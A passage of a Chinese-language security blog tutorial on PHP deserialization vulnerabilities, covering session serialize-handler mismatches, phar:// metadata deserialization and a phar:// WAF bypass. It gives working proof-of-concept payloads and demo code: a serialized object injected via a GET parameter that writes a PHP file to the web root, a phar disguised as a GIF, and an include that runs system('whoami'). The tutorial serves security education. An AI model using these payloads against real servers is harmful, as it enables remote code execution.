<h3 id="四-Session反序列化漏洞"><a href="#四-Session反序列化漏洞" class="headerlink" title="(四)    Session反序列化漏洞"></a>(四)    Session反序列化漏洞</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p><a href="http://php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.session-start.php</a><br><a href="http://php.net/manual/zh/function.session-set-save-handler.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.session-set-save-handler.php</a><br><a href="http://php.net/manual/zh/session.configuration.php#ini.session.serialize-handler" target="_blank" rel="noopener">http://php.net/manual/zh/session.configuration.php#ini.session.serialize-handler</a><br>1）Session反序列化漏洞，主要是由于: 当PHP在反序列化取出已存储的$_SESSION数据时所使用的处理器与之前序列化存储$_SESSION所使用的处理器不一样，会导致数据无法正确反序列化，可能导致存在漏洞。（存$_SESSION-序列化，取$_SESSION-反序列化）<br>2）当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。</p>
<p>3）PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化（存$_SESSION-序列化，取$_SESSION-反序列化），常用的有以下三种，对应三种不同的处理格式：【session.serialize_handler 配置选项】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">处理器	  对应的存储格式</span><br><span class="line">php (默认):键名 ＋ 竖线 ＋ 经过 serialize() 函数序列化处理的值。如：lltest|s:6:&quot;qwe123&quot;;</span><br><span class="line">php_serialize (php&gt;=5.5.4):经过 serialize() 函数反序列处理的数组。如：a:1:&#123;s:6:&quot;lltest&quot;;s:6:&quot;qwe123&quot;;&#125;</span><br><span class="line">php_binary:键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数序列化处理的值。如：lltests:6:&quot;qwe123&quot;;</span><br></pre></td></tr></table></figure></p>
<p>4）通过竖线|构造POC。<br>在存储$_SESSION数据时如果用的处理器是php_serialize ，通过竖线|构造POC,写入含有恶意代码的序列化数据。<br>在读取$_SESSION数据时如果用的处理器是 php 的话，会将竖线|后面的数据进行反序列化，从而触发漏洞。</p>
<h4 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1）	先请求sess1.php?www=|O:6:&quot;lltest&quot;:1:&#123;s:3:&quot;www&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;</span><br><span class="line">会在D:\phpStudy3\tmp\tmp\sess_jo0lfdd66sti0i1pfdfosgtec2文件中存储内容,如下</span><br><span class="line">a:1:&#123;s:6:&quot;lltest&quot;;s:52:&quot;|O:6:&quot;lltest&quot;:1:&#123;s:3:&quot;www&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;&quot;;&#125;</span><br><span class="line">存储$_SESSION数据时如果用的处理器是php_serialize </span><br><span class="line"></span><br><span class="line">2）然后直接访问sess2.php  就会在D:\\phpStudy3\\WWW\\test\\目录下生成lltest3.php文件，内容为&lt;?php phpinfo();</span><br><span class="line">在读取$_SESSION数据时用的处理器设置为 php，会将竖线|后面的数据进行反序列化，触发漏洞</span><br><span class="line">最终生成lltest3.php文件，内容为&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>
<h4 id="代码示例1-sess1-php"><a href="#代码示例1-sess1-php" class="headerlink" title="代码示例1 sess1.php"></a>代码示例1 sess1.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sess1.php</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;lltest&apos;] = $_GET[&apos;www&apos;];</span><br><span class="line">print_r($_SESSION);</span><br><span class="line"></span><br><span class="line">//提交请求xxx.php?www=|O:6:&quot;lltest&quot;:1:&#123;s:3:&quot;www&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;    通过竖线|构造POC</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="代码示例2-sess2-php"><a href="#代码示例2-sess2-php" class="headerlink" title="代码示例2 sess2.php"></a>代码示例2 sess2.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sess2.php</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $www;</span><br><span class="line">    </span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">		var_dump($_SESSION);  //输出：array(1) &#123; [&quot;a:1:&#123;s:6:&quot;lltest&quot;;s:52:&quot;&quot;]=&gt; object(lltest)#1 (1) &#123; [&quot;www&quot;]=&gt; string(16) &quot;</span><br><span class="line">		//可看出:将之前存储的$_SESSION进行反序列化，还原为对象object lltest</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy3\\WWW\\test\\lltest3.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;www);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//最终生成lltest3.php文件，内容为&lt;?php phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="五-phar伪协议触发php反序列化"><a href="#五-phar伪协议触发php反序列化" class="headerlink" title="(五)    phar伪协议触发php反序列化"></a>(五)    phar伪协议触发php反序列化</h3><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>phar文件本质上是一种压缩文件，能够以序列化的形式存储用户自定义的meta-data，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，会将meta-data进行反序列化，从而导致触发漏洞。<br>受影响的函数如下：<br>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><a href="http://php.net/manual/en/phar.fileformat.phar.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.phar.php</a><br>一个phar文件有四部分构成：<br>1）a stub<br>可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。<br>2）a manifest describing the contents<br>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p>3） the file contents<br>被压缩文件的内容。<br>4） [optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾</p>
<h4 id="漏洞测试-2"><a href="#漏洞测试-2" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>说明：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p>
<p>1）先访问phar1.php 文件，生成lltest1.phar文件，并以反序列化形式写入payload &lt;?php phpinfo();</p>
<p>2）请求phar2.php?www=phar://./lltest1.phar/test.txt<br>最终生成lltest6.php文件，内容为&lt;?php phpinfo();</p>
<p>在1）生成lltest1.phar之后，也可以将lltest1.phar文件改成任意后缀如jpg，然后请求phar2.php?www=phar://./lltest1.jpg/test.txt</p>
<p>phar://路径/lltest1.phar/test.txt</p>
<h4 id="代码示例1-phar1-php"><a href="#代码示例1-phar1-php" class="headerlink" title="代码示例1 phar1.php"></a>代码示例1 phar1.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $payload = &quot;&lt;?php phpinfo();&quot;;</span><br><span class="line">	//var $payload = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;lltest1.phar&quot;);</span><br><span class="line">$test = new lltest();</span><br><span class="line">$phar = new Phar(&quot;lltest1.phar&quot;); //后缀必须为hpar，生成后可改成任意后缀如jpg</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // //设置stub 并伪造gif文件头</span><br><span class="line">$phar-&gt;setMetadata($test);  //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="代码示例2-phar2-php"><a href="#代码示例2-phar2-php" class="headerlink" title="代码示例2 phar2.php"></a>代码示例2 phar2.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $www = $_GET[&apos;www&apos;];</span><br><span class="line">    class lltest&#123;</span><br><span class="line">        var $payload;</span><br><span class="line">        </span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">		var_dump($this-&gt;payload);  //当payload中含有&lt;时无法 无法输出</span><br><span class="line">		//echo &quot;phar test&quot;;</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy3\\WWW\\test\\lltest6.php&quot;,&quot;w&quot;); //自定义写入路径</span><br><span class="line">        fputs($fp,$this-&gt;payload);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    file_get_contents($www);</span><br><span class="line">	//file_get_contents(&quot;phar://./lltest1.phar/test.txt&quot;);</span><br><span class="line">	</span><br><span class="line">	//phar://路径/lltest1.phar/test.txt</span><br><span class="line">	//请求: ***.php?www=phar://./lltest1.phar/test.txt</span><br><span class="line">	//最终生成lltest6.php文件，内容为&lt;?php phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="六-补充-phar伪协议绕过WAF"><a href="#六-补充-phar伪协议绕过WAF" class="headerlink" title="(六)    补充:phar伪协议绕过WAF"></a>(六)    补充:phar伪协议绕过WAF</h3><p>使用phar://伪协议可Bypass一些waf，大多数情况下配合文件包含一起使用。</p>
<p>1）必须先把pharbypass1.php压缩。<br>或者压缩完之后，修改为其他任意后缀 如jpg 来绕过上传限制等<br>然后修改pharbypass2.php为include(‘phar://./pharbypass1.jpg/pharbypass1.php’)</p>
<p>2）请求pharbypass2.php,会include文件pharbypass1.zip中的pharbypass1.php  执行system(‘whoami’)</p>
<h4 id="pharbypass1-php"><a href="#pharbypass1-php" class="headerlink" title="pharbypass1.php"></a>pharbypass1.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&apos;whoami&apos;);</span><br><span class="line">//必须先压缩该文件。压缩完之后，可以再修改为其他任意后缀 如jpg 来绕过上传限制等</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="pharbypass2-php"><a href="#pharbypass2-php" class="headerlink" title="pharbypass2.php"></a>pharbypass2.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&apos;phar://./pharbypass1.zip/pharbypass1.php&apos;);</span><br><span class="line">//请求pharbypass2.php,会include文件pharbypass1.zip中的pharbypass1.php  执行system(&apos;whoami&apos;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a>  浅谈php反序列化漏洞<br><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a>  四个实例递进php反序列化漏洞理解<br><a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a>  SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析<br><a href="http://www.vuln.cn/6413" target="_blank" rel="noopener">http://www.vuln.cn/6413</a>  PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患<br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>  利用 phar 拓展 php 反序列化漏洞攻击面<br><a href="https://xz.aliyun.com/t/3692" target="_blank" rel="noopener">https://xz.aliyun.com/t/3692</a>  Phar的一些利用姿势 </p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/22/PHP花式WEBSHELL/" rel="next" title="PHP花式WEBSHELL">
                <i class="fa fa-chevron-left"></i> PHP花式WEBSHELL
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/01/31/PHP变量覆盖/" rel="prev" title="PHP变量覆盖">
                PHP变量覆盖 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/ppl.jpg" alt="pplsec">
            
              <p class="site-author-name" itemprop="name">pplsec</p>
              <p class="site-description motion-element" itemprop="description">渗透测试 应急响应 代码审计</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一-序列化与反序列化基础"><span class="nav-text">(一)    序列化与反序列化基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#serialize"><span class="nav-text">serialize()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化示例代码"><span class="nav-text">序列化示例代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化数据格式说明"><span class="nav-text">序列化数据格式说明</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unserialize"><span class="nav-text">unserialize()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化示例代码"><span class="nav-text">反序列化示例代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二-反序列化漏洞与魔法函数"><span class="nav-text">(二)    反序列化漏洞与魔法函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原理"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#魔术方法"><span class="nav-text">魔术方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化时魔术方法调用示例"><span class="nav-text">反序列化时魔术方法调用示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wakeup-或-destruct"><span class="nav-text">__wakeup() 或__destruct()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#wakeup-漏洞代码示例"><span class="nav-text">__wakeup()漏洞代码示例</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码"><span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#生成POC"><span class="nav-text">生成POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#间接调用"><span class="nav-text">间接调用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码-1"><span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#生成POC-1"><span class="nav-text">生成POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用普通成员方法-相同函数名称"><span class="nav-text">利用普通成员方法-相同函数名称</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#测试代码-2"><span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#生成POC-2"><span class="nav-text">生成POC</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#三-CVE-2016-7124"><span class="nav-text">(三)    CVE-2016-7124</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞测试"><span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2016-7124-php"><span class="nav-text">CVE-2016-7124.php</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四-Session反序列化漏洞"><span class="nav-text">(四)    Session反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原理-1"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞测试-1"><span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码示例1-sess1-php"><span class="nav-text">代码示例1 sess1.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码示例2-sess2-php"><span class="nav-text">代码示例2 sess2.php</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五-phar伪协议触发php反序列化"><span class="nav-text">(五)    phar伪协议触发php反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原理-2"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar文件结构"><span class="nav-text">phar文件结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞测试-2"><span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码示例1-phar1-php"><span class="nav-text">代码示例1 phar1.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码示例2-phar2-php"><span class="nav-text">代码示例2 phar2.php</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#六-补充-phar伪协议绕过WAF"><span class="nav-text">(六)    补充:phar伪协议绕过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pharbypass1-php"><span class="nav-text">pharbypass1.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pharbypass2-php"><span class="nav-text">pharbypass2.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></li></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">pplsec</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
